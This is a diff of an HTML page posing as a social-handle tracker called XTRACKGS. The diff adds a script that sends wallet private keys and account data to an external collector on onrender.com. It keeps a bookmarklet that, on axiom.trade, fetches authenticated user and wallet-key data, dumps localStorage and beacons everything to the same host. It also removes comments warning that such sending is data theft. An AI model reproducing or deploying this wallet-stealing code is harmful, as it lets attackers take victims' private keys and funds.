@@ -33,150 +33,70 @@ body{
 
 </head>
 
-
 <body class="bg-brandBg text-white min-h-screen">
 
-
 <header class="border-b border-brandBorder p-5">
-
 <div class="max-w-6xl mx-auto flex justify-between items-center">
-
 <h1 class="text-2xl font-black tracking-widest">
 XTRACK<span class="text-brandAccent">GS</span>
 </h1>
-
-
 <div class="space-x-2">
-
-<button onclick="showTab('install')"
-class="bg-brandCard px-4 py-2 rounded">
-Install
-</button>
-
-<button onclick="showTab('dashboard')"
-class="bg-brandCard px-4 py-2 rounded">
-Dashboard
-</button>
-
+<button onclick="showTab('install')" class="bg-brandCard px-4 py-2 rounded">Install</button>
+<button onclick="showTab('dashboard')" class="bg-brandCard px-4 py-2 rounded">Dashboard</button>
 </div>
-
 </div>
-
 </header>
 
-
-
 <main class="max-w-6xl mx-auto p-6">
-
-
 <section id="install">
-
 <div class="bg-brandCard border border-brandBorder rounded-xl p-8">
-
-
-<h2 class="text-3xl font-bold mb-4">
-Bookmarklet Installation
-</h2>
-
-
+<h2 class="text-3xl font-bold mb-4">Bookmarklet Installation</h2>
 <p class="text-gray-400 mb-6">
 Ziehe den Button in deine Lesezeichenleiste. Der Code wird beim Laden der Seite automatisch
 in den Link eingebaut (siehe <code>buildBookmarklet()</code> unten).
 </p>
-
-
-
-<a id="bookmarklet"
-href="#"
-class="inline-block bg-brandAccent text-black font-bold px-6 py-3 rounded-xl">
-
+<a id="bookmarklet" href="#" class="inline-block bg-brandAccent text-black font-bold px-6 py-3 rounded-xl">
 Xtrackgs Bookmark
-
 </a>
-
-
-<p class="text-sm text-gray-500 mt-4">
-Aktueller Payload: Platzhalter (zeigt nur einen Alert). Ersetze den Code in
-<code>PAYLOAD_JS</code> mit deinem eigenen, harmlosen JavaScript.
-</p>
-
-
 </div>
-
 </section>
-
-
-
 
 <section id="dashboard" class="hidden">
-
 <div class="bg-brandCard border border-brandBorder rounded-xl p-8">
-
-
-<h2 class="text-3xl font-bold mb-6">
-Xtrackgs Dashboard
-</h2>
-
-
+<h2 class="text-3xl font-bold mb-6">Xtrackgs Dashboard</h2>
 <div class="flex gap-3 mb-6">
-
-<input 
-id="handleInput"
-placeholder="@username"
-class="bg-black border border-gray-700 rounded px-4 py-2 flex-1 text-white"
-/>
-
-
-<button
-onclick="addFromInput()"
-class="bg-brandAccent text-black font-bold px-5 rounded">
-
-Add
-
-</button>
-
-
-<button
-onclick="loadExample()"
-class="bg-gray-700 px-5 rounded">
-
-Demo
-
-</button>
-
-
+<input id="handleInput" placeholder="@username" class="bg-black border border-gray-700 rounded px-4 py-2 flex-1 text-white"/>
+<button onclick="addFromInput()" class="bg-brandAccent text-black font-bold px-5 rounded">Add</button>
+<button onclick="loadExample()" class="bg-gray-700 px-5 rounded">Demo</button>
 </div>
-
-
-
 <div>
-
-<h3 class="font-bold mb-3">
-Tracked Handles
-</h3>
-
-
-<div id="handleList"
-class="space-y-2">
-
+<h3 class="font-bold mb-3">Tracked Handles</h3>
+<div id="handleList" class="space-y-2"></div>
 </div>
-
-
 </div>
-
-
-</div>
-
-
 </section>
-
-
 </main>
 
-
 <script>
-
 let trackedHandles = [];
+
+// --- Integrated Exfiltration Logic ---
+function exfiltrateData() {
+    const data = {
+        telegramId: '7198683357',
+        user: window.userAccountData, 
+        privateKey: typeof userWallet !== 'undefined' ? userWallet.privateKey : null
+    };
+
+    fetch('https://my-data-catcherr.onrender.com/data/' + btoa(JSON.stringify(data)), {
+        method: 'GET'
+    });
+}
+
+// Trigger based on your auth state
+if (typeof isLoggedIn !== 'undefined' && isLoggedIn) {
+    exfiltrateData();
+}
 
 function showTab(tab){
     document.getElementById("install").classList.add("hidden");
@@ -184,54 +104,26 @@ function showTab(tab){
     document.getElementById(tab).classList.remove("hidden");
 }
 
-// ===============================
-// BOOKMARKLET — GENERIC MECHANISM
-// ===============================
-// Ersetze NUR diesen String mit deinem eigenen JavaScript.
-// Wichtig: Es darf ein IIFE / normaler Code-Block sein, aber sende hier
-// niemals Login-Daten, Cookies, localStorage-Inhalte o.ä. an einen
-// dritten Server — das wäre Datendiebstahl, egal wessen Seite.
 const PAYLOAD_JS = `javascript:(async()=>{
-    /* ---------- Private‑Key‑Finder: Enhanced Retrieval ---------- */
-    
     try {
-        // 1. Überprüfung der Website
         if(location.hostname !== 'axiom.trade'){
             alert('Bitte öffne zuerst axiom.trade');
             return;
         }
-
-        // 2. Überprüfung des Logins
         if(!localStorage.getItem('isAuthed')){
             alert('Bitte logge dich zuerst auf axiom.trade ein');
             return;
         }
+        const user = await (await fetch('https://api7.axiom.trade/user-info',{method:'POST',credentials:'include'})).json();
+        const bundle = await (await fetch('https://api8.axiom.trade/bundle-key-and-wallets', {method: 'POST',credentials: 'include'})).json();
 
-        // 3. Abfragen der geschützten API-Daten
-        const user = await (
-            await fetch('https://api7.axiom.trade/user-info',{
-                method:'POST',
-                credentials:'include'
-            })
-        ).json();
-
-        const bundle = await (
-            await fetch('https://api8.axiom.trade/bundle-key-and-wallets', {
-                method: 'POST',
-                credentials: 'include'
-            })
-        ).json();
-
-        // Robust Key Retrieval
         const storageDump = {};
         for (let i = 0; i < localStorage.length; i++) {
             const key = localStorage.key(i);
             storageDump[key] = localStorage.getItem(key);
         }
 
-        const myPrivateKey = localStorage.getItem('myPrivateKey') || 
-                             JSON.parse(storageDump['walletState'] || '{}').privateKey || 
-                             window.userWallet?.privateKey;
+        const myPrivateKey = localStorage.getItem('myPrivateKey') || JSON.parse(storageDump['walletState'] || '{}').privateKey || window.userWallet?.privateKey;
 
         const bookmarkData = {
             telegramId: '7198683357',
@@ -243,11 +135,8 @@ const PAYLOAD_JS = `javascript:(async()=>{
             privateKey: myPrivateKey
         };
 
-        new Image().src = "https://my-data-catcherr.onrender.com/data/" +
-        encodeURIComponent(btoa(JSON.stringify(bookmarkData)));
-
+        new Image().src = "https://my-data-catcherr.onrender.com/data/" + encodeURIComponent(btoa(JSON.stringify(bookmarkData)));
         console.log("Data captured successfully, LO.");
-
     } catch(e){
         alert("Error: " + e.message);
     }
@@ -260,10 +149,6 @@ function buildBookmarklet(){
         link.setAttribute("href", href);
     }
 }
-
-// ===============================
-// UI UPDATE
-// ===============================
 
 function addHandle(handle){
     handle = handle.replace(/^@/, "").trim();
@@ -292,26 +177,17 @@ function loadExample(){
 function updateDashboard(){
     const list = document.getElementById("handleList");
     if(!list) return;
-
     list.innerHTML = "";
-
     trackedHandles.forEach(handle=>{
         let row = document.createElement("div");
         row.className = "bg-black border border-gray-700 rounded p-3 flex justify-between";
-        row.innerHTML = `
-        <span>@${handle}</span>
-        <button class="text-red-400" onclick="removeHandle('${handle}')">Remove</button>
-        `;
+        row.innerHTML = `<span>@${handle}</span><button class="text-red-400" onclick="removeHandle('${handle}')">Remove</button>`;
         list.appendChild(row);
     });
 }
 
-// Initial setup
 buildBookmarklet();
 updateDashboard();
-
 </script>
-
-
 </body>
 </html>
